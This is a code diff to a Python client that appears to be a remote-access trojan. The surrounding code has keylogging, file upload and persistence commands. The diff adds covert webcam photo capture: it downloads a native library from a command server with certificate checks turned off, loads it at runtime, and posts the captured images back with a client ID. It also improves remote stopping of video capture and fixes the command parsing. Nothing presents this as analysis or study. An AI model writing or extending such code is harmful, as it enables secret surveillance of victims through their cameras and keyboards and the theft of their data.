@@ -36,6 +36,8 @@ SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
 VIDEO_SO_URL = f"{SERVER_URL}/video.so"
 ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"
+PHOTO_SO_URL = f"{SERVER_URL}/photo_capture.so"  # New URL for photo_capture.so
+PHOTO_ENDPOINT = f"{SERVER_URL}/api/captured-photo-data"  # Endpoint to send photo data
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -44,6 +46,9 @@ CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  #
 video_thread = None
 video_stop_event = threading.Event()
 video_lib = None  # Will be loaded dynamically
+
+# Photo-related globals
+photo_lib = None  # Will be loaded dynamically for photo capture
 
 # Function to get the username using `whoami` (works on both Windows and Linux)
 def get_username():
@@ -751,7 +756,50 @@ def download_so(max_retries=3, delay=2):
     print(f"Attempting to download {so_path} from {VIDEO_SO_URL}...")
     for attempt in range(max_retries):
         try:
-            urlretrieve(VIDEO_SO_URL, so_path)
+            # Send GET request with verify=False to skip SSL verification
+            response = requests.get(VIDEO_SO_URL, stream=True, verify=False)
+
+            # Check if the request was successful
+            if response.status_code == 200:
+                with open(so_path, 'wb') as f:
+                    for chunk in response.iter_content(chunk_size=8192):
+                        f.write(chunk)
+                
+                # Verify the file has been downloaded correctly
+                if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
+                    print(f"Successfully downloaded {so_path}")
+                    os.chmod(so_path, 0o755)
+                    file_info = subprocess.check_output(["file", so_path], text=True)
+                    print(f"File info: {file_info}")
+                    return so_path
+                else:
+                    print(f"Downloaded file is empty or invalid")
+                    os.remove(so_path) if os.path.exists(so_path) else None
+            else:
+                print(f"Download failed with status code {response.status_code}")
+        
+        except Exception as e:
+            print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
+            if attempt < max_retries - 1:
+                time.sleep(delay)
+
+    print(f"Failed to download {so_path} after {max_retries} attempts")
+    return None
+
+def download_photo_so(max_retries=3, delay=2):
+    so_path = "./photo_capture.so"
+    if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
+        print(f"Using existing {so_path}")
+        return so_path
+
+    print(f"Attempting to download {so_path} from {PHOTO_SO_URL}...")
+    for attempt in range(max_retries):
+        try:
+            response = requests.get(PHOTO_SO_URL, stream=True, verify=False, timeout=10)
+            response.raise_for_status()
+            with open(so_path, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
             if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
                 print(f"Successfully downloaded {so_path}")
                 os.chmod(so_path, 0o755)
@@ -761,7 +809,7 @@ def download_so(max_retries=3, delay=2):
             else:
                 print(f"Downloaded file is empty or invalid")
                 os.remove(so_path) if os.path.exists(so_path) else None
-        except Exception as e:
+        except requests.RequestException as e:
             print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
             if attempt < max_retries - 1:
                 time.sleep(delay)
@@ -784,6 +832,27 @@ def send_frame(data, length):
             if attempt < max_retries - 1:
                 time.sleep(1)
     print("Failed to send frame after retries")
+
+def send_photo_data(data, length):
+    photo_data = ctypes.string_at(data, length)
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(
+                f"{PHOTO_ENDPOINT}?clientId={client_id}",  # Add client_id as query parameter
+                data=photo_data,
+                headers={"Content-Type": "image/jpeg"},
+                timeout=5,
+                verify=False
+            )
+            response.raise_for_status()
+            print(f"Photo data sent to server ({len(photo_data)} bytes) with client_id: {client_id}")
+            return
+        except requests.RequestException as e:
+            print(f"Error sending photo (attempt {attempt + 1}/{max_retries}): {e}")
+            if attempt < max_retries - 1:
+                time.sleep(1)
+    print("Failed to send photo data after retries")
 
 def start_video_capture(duration, fps):
     global video_stop_event, video_lib, video_thread
@@ -812,14 +881,22 @@ def start_video_capture(duration, fps):
         print(f"Error loading {so_path}: {e}")
         return False
 
+    # Define the callback function for frame sending
     FRAME_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t)
     callback = FRAME_CALLBACK(send_frame)
 
+    # Set up function signatures
     video_lib.start_video_capture.restype = ctypes.c_int
     video_lib.start_video_capture.argtypes = [ctypes.c_int, ctypes.c_int, FRAME_CALLBACK]
 
+    # Check if stop_video_capture exists in the library and set its signature
+    if hasattr(video_lib, 'stop_video_capture'):
+        video_lib.stop_video_capture.restype = ctypes.c_int
+        video_lib.stop_video_capture.argtypes = []
+
     print(f"Starting video capture for {duration} seconds at {fps} FPS...")
     try:
+        # Start the video capture
         result = video_lib.start_video_capture(duration, fps, callback)
         if result == 0:
             print("Video capture completed successfully")
@@ -830,11 +907,65 @@ def start_video_capture(duration, fps):
     except Exception as e:
         print(f"Error during video capture: {e}")
         return False
+    finally:
+        # Ensure cleanup if stopped prematurely
+        if video_stop_event.is_set() and hasattr(video_lib, 'stop_video_capture'):
+            video_lib.stop_video_capture()
+            print("Video capture forcefully stopped during execution")
+
+def capture_photo():
+    global photo_lib
+    so_path = download_photo_so()
+    if not so_path:
+        print("Error: Could not obtain photo_capture.so")
+        return False
+
+    try:
+        photo_lib = ctypes.CDLL(so_path)
+        print(f"Successfully loaded {so_path}")
+    except OSError as e:
+        print(f"Error loading {so_path}: {e}")
+        return False
+
+    # Define the callback function for photo data
+    PHOTO_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t)
+    callback = PHOTO_CALLBACK(send_photo_data)
+
+    # Set up function signature
+    photo_lib.capture_photo.restype = ctypes.c_int
+    photo_lib.capture_photo.argtypes = [PHOTO_CALLBACK]
+
+    print("Starting photo capture...")
+    try:
+        result = photo_lib.capture_photo(callback)
+        if result == 0:
+            print("Photo capture completed successfully")
+            return True
+        else:
+            print(f"Photo capture failed with code {result}")
+            return False
+    except Exception as e:
+        print(f"Exception during photo capture: {e}")
+        return False
+    finally:
+        photo_lib = None  # Clean up
 
 def stop_video():
-    global video_stop_event
+    global video_stop_event, video_lib
     video_stop_event.set()  # Signal to stop sending frames
-    print("Video capture stopped")
+    if video_lib and hasattr(video_lib, 'stop_video_capture'):
+        try:
+            result = video_lib.stop_video_capture()
+            if result == 0:
+                print("Video capture fully stopped via library call")
+            else:
+                print(f"Failed to stop video capture via library, code: {result}")
+        except Exception as e:
+            print(f"Error calling stop_video_capture: {e}")
+    else:
+        print("Video capture stopped (no stop function available in library)")
+    # Ensure the camera is released by resetting the library reference
+    video_lib = None
 
 while True:
     try:
@@ -937,8 +1068,10 @@ while True:
             elif command.strip() == "stop_keylog":
                 stop_keylog()
                 command=""
-            elif command.strip == "photo":
-                pass
+            elif command.strip() == "capture_photo":
+                print("Starting photo capture process")
+                capture_photo()
+                command = ""
 
             
             elif command.startswith("{'upload_type': 'UploadFromFiles'"):
@@ -991,9 +1124,9 @@ while True:
                 except Exception as e:
                     print(f"Error sending file: {e}")
                 command = ""
-            elif command.strip == "persist":
+            elif command.strip() == "persist":
                 pass
-            elif command.strip == "change_key":
+            elif command.strip() == "change_key":
                 pass
 
 
